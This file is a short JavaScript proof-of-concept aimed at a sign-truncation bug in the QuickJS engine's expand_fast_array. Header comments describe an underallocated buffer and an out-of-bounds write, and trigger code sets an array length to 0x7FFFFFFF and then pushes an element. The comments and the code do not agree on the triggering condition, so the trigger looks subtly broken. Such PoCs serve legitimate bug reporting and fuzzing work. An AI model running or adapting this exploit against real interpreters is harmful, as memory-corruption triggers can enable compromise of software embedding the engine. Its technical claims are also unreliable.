// QuickJS expand_fast_array max_int sign truncation — commit 40e197f
// Bug: expand_fast_array calls max_int(new_len, new_size) where new_len is uint32_t.
//      When new_len >= 0x80000000, cast to int makes it negative.
//      max_int returns the small grow-by-50% size. Buffer is underallocated.
//      add_fast_array_element then writes to values[new_len-1] — OOB write.
// Run: qjs poc.js

const c = [1, 2, 3];
c.length = 0x7FFFFFFF;  // sets length property; count stays 3
c.push(4);              // new_len = count+1; if > size, expand_fast_array called
                        // sign truncation: max_int underallocates; OOB write follows
print("done");
